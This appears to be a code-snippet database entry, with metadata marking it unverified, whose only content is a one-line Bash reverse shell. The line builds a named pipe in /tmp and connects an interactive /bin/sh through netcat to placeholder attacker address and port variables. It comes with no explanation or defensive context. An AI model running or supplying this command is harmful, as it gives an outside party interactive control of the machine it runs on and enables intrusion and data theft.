---
id: c76e17a9-0541-4d6e-825a-474b99e0fbdb
type: code
language: Bash
verified: false
created_at: '2019-10-09T22:21:56.346567+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet c76e17a9

**Language**: Bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```


